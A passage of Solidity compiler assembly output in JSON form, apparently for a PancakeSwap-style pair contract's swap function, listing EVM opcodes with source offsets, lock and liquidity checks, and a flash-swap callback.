											"name": "JUMPDEST"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "PUSH [tag]",
											"value": "127"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 11720,
											"end": 14573,
											"name": "JUMPDEST"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "SLOAD"
										},
										{
											"begin": 1304,
											"end": 1305,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1292,
											"end": 1305,
											"name": "EQ"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH [tag]",
											"value": "129"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPI"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SUB"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "REVERT"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "tag",
											"value": "129"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPDEST"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SSTORE"
										},
										{
											"begin": 11884,
											"end": 11898,
											"name": "DUP5"
										},
										{
											"begin": 11884,
											"end": 11898,
											"name": "ISZERO"
										},
										{
											"begin": 11884,
											"end": 11898,
											"name": "ISZERO"
										},
										{
											"begin": 11884,
											"end": 11898,
											"name": "DUP1"
										},
										{
											"begin": 11884,
											"end": 11916,
											"name": "PUSH [tag]",
											"value": "131"
										},
										{
											"begin": 11884,
											"end": 11916,
											"name": "JUMPI"
										},
										{
											"begin": 11884,
											"end": 11916,
											"name": "POP"
										},
										{
											"begin": 11915,
											"end": 11916,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 11902,
											"end": 11912,
											"name": "DUP5"
										},
										{
											"begin": 11902,
											"end": 11916,
											"name": "GT"
										},
										{
											"begin": 11884,
											"end": 11916,
											"name": "tag",
											"value": "131"
										},
										{
											"begin": 11884,
											"end": 11916,
											"name": "JUMPDEST"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH [tag]",
											"value": "132"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "JUMPI"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP2"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "MSTORE"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "ADD"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP1"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP1"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "ADD"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP3"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP2"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "SUB"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP3"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "MSTORE"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP2"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "MSTORE"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "ADD"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP1"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH data",
											"value": "C654718515B5F98052EB92744D97D32CCCABF6E8B2BAE886738591C9B906CFD8"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "SWAP2"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "CODECOPY"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "ADD"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "SWAP2"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "POP"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "POP"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "MLOAD"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "DUP1"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "SWAP2"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "SUB"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "SWAP1"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "REVERT"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "tag",
											"value": "132"
										},
										{
											"begin": 11863,
											"end": 11977,
											"name": "JUMPDEST"
										},
										{
											"begin": 11988,
											"end": 12005,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12007,
											"end": 12024,
											"name": "DUP1"
										},
										{
											"begin": 12030,
											"end": 12043,
											"name": "PUSH [tag]",
											"value": "133"
										},
										{
											"begin": 12030,
											"end": 12041,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 12030,
											"end": 12043,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12030,
											"end": 12043,
											"name": "tag",
											"value": "133"
										},
										{
											"begin": 12030,
											"end": 12043,
											"name": "JUMPDEST"
										},
										{
											"begin": 11987,
											"end": 12043,
											"name": "POP"
										},
										{
											"begin": 11987,
											"end": 12043,
											"name": "SWAP2"
										},
										{
											"begin": 11987,
											"end": 12043,
											"name": "POP"
										},
										{
											"begin": 11987,
											"end": 12043,
											"name": "SWAP2"
										},
										{
											"begin": 11987,
											"end": 12043,
											"name": "POP"
										},
										{
											"begin": 12102,
											"end": 12111,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12089,
											"end": 12111,
											"name": "AND"
										},
										{
											"begin": 12089,
											"end": 12099,
											"name": "DUP8"
										},
										{
											"begin": 12089,
											"end": 12111,
											"name": "LT"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "DUP1"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "ISZERO"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "PUSH [tag]",
											"value": "134"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "JUMPI"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "POP"
										},
										{
											"begin": 12128,
											"end": 12137,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12115,
											"end": 12137,
											"name": "AND"
										},
										{
											"begin": 12115,
											"end": 12125,
											"name": "DUP7"
										},
										{
											"begin": 12115,
											"end": 12137,
											"name": "LT"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "tag",
											"value": "134"
										},
										{
											"begin": 12089,
											"end": 12137,
											"name": "JUMPDEST"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH [tag]",
											"value": "135"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "JUMPI"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "DUP1"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "DUP2"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "MSTORE"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "DUP3"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "ADD"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "MSTORE"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "DUP3"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "ADD"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "MSTORE"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "50616E63616B653A20494E53554646494349454E545F4C495155494449545900"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "DUP3"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "ADD"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "MSTORE"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "SWAP1"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "MLOAD"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "SWAP1"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "DUP2"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "SWAP1"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "SUB"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "ADD"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "SWAP1"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "REVERT"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "tag",
											"value": "135"
										},
										{
											"begin": 12068,
											"end": 12194,
											"name": "JUMPDEST"
										},
										{
											"begin": 12205,
											"end": 12218,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12205,
											"end": 12218,
											"name": "DUP1"
										},
										{
											"begin": 12205,
											"end": 12218,
											"name": "DUP1"
										},
										{
											"begin": 12318,
											"end": 12321,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12313,
											"end": 12314,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 12300,
											"end": 12314,
											"name": "DUP12"
										},
										{
											"begin": 12300,
											"end": 12314,
											"name": "MUL"
										},
										{
											"begin": 12299,
											"end": 12321,
											"name": "DIV"
										},
										{
											"begin": 12286,
											"end": 12321,
											"name": "DUP11"
										},
										{
											"begin": 12286,
											"end": 12321,
											"name": "SUB"
										},
										{
											"begin": 12286,
											"end": 12321,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 12335,
											"end": 12353,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12388,
											"end": 12391,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12383,
											"end": 12384,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 12370,
											"end": 12384,
											"name": "DUP12"
										},
										{
											"begin": 12370,
											"end": 12384,
											"name": "MUL"
										},
										{
											"begin": 12491,
											"end": 12497,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 12491,
											"end": 12497,
											"name": "SLOAD"
										},
										{
											"begin": 12529,
											"end": 12535,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 12529,
											"end": 12535,
											"name": "SLOAD"
										},
										{
											"begin": 12369,
											"end": 12391,
											"name": "SWAP3"
										},
										{
											"begin": 12369,
											"end": 12391,
											"name": "SWAP1"
										},
										{
											"begin": 12369,
											"end": 12391,
											"name": "SWAP2"
										},
										{
											"begin": 12369,
											"end": 12391,
											"name": "DIV"
										},
										{
											"begin": 12356,
											"end": 12391,
											"name": "DUP13"
										},
										{
											"begin": 12356,
											"end": 12391,
											"name": "SUB"
										},
										{
											"begin": 12356,
											"end": 12391,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12491,
											"end": 12497,
											"name": "SWAP1"
										},
										{
											"begin": 12491,
											"end": 12497,
											"name": "DUP2"
										},
										{
											"begin": 12491,
											"end": 12497,
											"name": "AND"
										},
										{
											"begin": 12491,
											"end": 12497,
											"name": "SWAP2"
										},
										{
											"begin": 12529,
											"end": 12535,
											"name": "DUP2"
										},
										{
											"begin": 12529,
											"end": 12535,
											"name": "AND"
										},
										{
											"begin": 12529,
											"end": 12535,
											"name": "SWAP1"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "DUP12"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "AND"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "DUP3"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "EQ"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "DUP1"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "ISZERO"
										},
										{
											"begin": 12557,
											"end": 12570,
											"name": "SWAP1"
										},
										{
											"begin": 12557,
											"end": 12587,
											"name": "PUSH [tag]",
											"value": "138"
										},
										{
											"begin": 12557,
											"end": 12587,
											"name": "JUMPI"
										},
										{
											"begin": 12557,
											"end": 12587,
											"name": "POP"
										},
										{
											"begin": 12580,
											"end": 12587,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12574,
											"end": 12587,
											"name": "AND"
										},
										{
											"begin": 12574,
											"end": 12576,
											"name": "DUP12"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12574,
											"end": 12587,
											"name": "AND"
										},
										{
											"begin": 12574,
											"end": 12587,
											"name": "EQ"
										},
										{
											"begin": 12574,
											"end": 12587,
											"name": "ISZERO"
										},
										{
											"begin": 12557,
											"end": 12587,
											"name": "tag",
											"value": "138"
										},
										{
											"begin": 12557,
											"end": 12587,
											"name": "JUMPDEST"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH [tag]",
											"value": "139"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "JUMPI"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "DUP1"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "DUP2"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "MSTORE"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "DUP3"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "ADD"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "MSTORE"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "13"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "DUP3"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "ADD"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F544F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "68"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "DUP3"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "ADD"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "MSTORE"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "SWAP1"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "MLOAD"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "SWAP1"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "DUP2"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "SWAP1"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "SUB"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "ADD"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "SWAP1"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "REVERT"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "tag",
											"value": "139"
										},
										{
											"begin": 12549,
											"end": 12611,
											"name": "JUMPDEST"
										},
										{
											"begin": 12629,
											"end": 12643,
											"name": "DUP13"
										},
										{
											"begin": 12629,
											"end": 12643,
											"name": "ISZERO"
										},
										{
											"begin": 12625,
											"end": 12686,
											"name": "PUSH [tag]",
											"value": "141"
										},
										{
											"begin": 12625,
											"end": 12686,
											"name": "JUMPI"
										},
										{
											"begin": 12645,
											"end": 12686,
											"name": "PUSH [tag]",
											"value": "141"
										},
										{
											"begin": 12659,
											"end": 12666,
											"name": "DUP3"
										},
										{
											"begin": 12668,
											"end": 12670,
											"name": "DUP13"
										},
										{
											"begin": 12672,
											"end": 12685,
											"name": "DUP7"
										},
										{
											"begin": 12645,
											"end": 12658,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 12645,
											"end": 12686,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12645,
											"end": 12686,
											"name": "tag",
											"value": "141"
										},
										{
											"begin": 12645,
											"end": 12686,
											"name": "JUMPDEST"
										},
										{
											"begin": 12738,
											"end": 12752,
											"name": "DUP12"
										},
										{
											"begin": 12738,
											"end": 12752,
											"name": "ISZERO"
										},
										{
											"begin": 12734,
											"end": 12795,
											"name": "PUSH [tag]",
											"value": "144"
										},
										{
											"begin": 12734,
											"end": 12795,
											"name": "JUMPI"
										},
										{
											"begin": 12754,
											"end": 12795,
											"name": "PUSH [tag]",
											"value": "144"
										},
										{
											"begin": 12768,
											"end": 12775,
											"name": "DUP2"
										},
										{
											"begin": 12777,
											"end": 12779,
											"name": "DUP13"
										},
										{
											"begin": 12781,
											"end": 12794,
											"name": "DUP6"
										},
										{
											"begin": 12754,
											"end": 12767,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 12754,
											"end": 12795,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12754,
											"end": 12795,
											"name": "tag",
											"value": "144"
										},
										{
											"begin": 12754,
											"end": 12795,
											"name": "JUMPDEST"
										},
										{
											"begin": 12847,
											"end": 12862,
											"name": "DUP9"
										},
										{
											"begin": 12847,
											"end": 12862,
											"name": "ISZERO"
										},
										{
											"begin": 12843,
											"end": 13087,
											"name": "PUSH [tag]",
											"value": "145"
										},
										{
											"begin": 12843,
											"end": 13087,
											"name": "JUMPI"
										},
										{
											"begin": 12895,
											"end": 12897,
											"name": "DUP11"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12880,
											"end": 12910,
											"name": "AND"
										},
										{
											"begin": 12880,
											"end": 12910,
											"name": "PUSH",
											"value": "84800812"
										},
										{
											"begin": 12932,
											"end": 12942,
											"name": "CALLER"
										},
										{
											"begin": 12964,
											"end": 12977,
											"name": "DUP7"
										},
										{
											"begin": 13014,
											"end": 13027,
											"name": "DUP7"
										},
										{
											"begin": 13065,
											"end": 13069,
											"name": "DUP15"
										},
										{
											"begin": 13065,
											"end": 13069,
											"name": "DUP15"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MLOAD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP7"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "AND"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "SHL"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MSTORE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ADD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP1"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "AND"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MSTORE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ADD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP6"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MSTORE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ADD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP5"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MSTORE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ADD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP1"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ADD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP3"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "SUB"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP3"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MSTORE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP5"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP5"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP3"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MSTORE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ADD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "SWAP3"
										},
										{
											"begin": 12880,
